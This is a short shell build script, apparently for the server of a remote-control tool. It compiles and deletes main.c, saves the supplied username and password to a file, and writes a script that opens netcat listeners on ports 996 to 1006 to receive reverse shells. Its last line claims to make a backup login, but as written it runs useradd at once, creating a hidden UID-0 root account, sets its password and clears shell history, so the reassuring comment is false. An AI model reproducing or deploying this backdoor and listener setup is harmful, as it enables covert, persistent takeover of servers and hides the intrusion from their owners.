#Build:
#USAGE - sh build.sh <ROOTING USER> <ROOTING PASS> <SERVER IP>
cd /root

yum install gcc -y; yum install nano -y;

gcc main.c -o main
rm -rf main.c

echo $1 >> details.txt
echo $2 >> details.txt

#Created the databases folder
#All databses in TXT form are to be stored here
mkdir databases

#Used to open the ports for the reverse shell. 
echo 'screen -d -m bash -c "nc -l 996"' >> openreverseshell.sh
echo 'screen -d -m bash -c "nc -l 997"' >> openreverseshell.sh
echo 'screen -d -m bash -c "nc -l 998"' >> openreverseshell.sh
echo 'screen -d -m bash -c "nc -l 999"' >> openreverseshell.sh
echo 'screen -d -m bash -c "nc -l 1000"' >> openreverseshell.sh
echo 'screen -d -m bash -c "nc -l 1001"' >> openreverseshell.sh
echo 'screen -d -m bash -c "nc -l 1002"' >> openreverseshell.sh
echo 'screen -d -m bash -c "nc -l 1003"' >> openreverseshell.sh
echo 'screen -d -m bash -c "nc -l 1004"' >> openreverseshell.sh
echo 'screen -d -m bash -c "nc -l 1005"' >> openreverseshell.sh
echo 'screen -d -m bash -c "nc -l 1006"' >> openreverseshell.sh
 
#This below is not me trying to root your server. It is creating a file with the username and password you
#Activae it from main.c - this would be used to keep a seoncd login to your server incase someone jacked it
#And you didnt have cpan access to reset the server root password. 
echo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash $1; echo -e $2"\n"$2 | passwd $1; history -c; >> root.sh
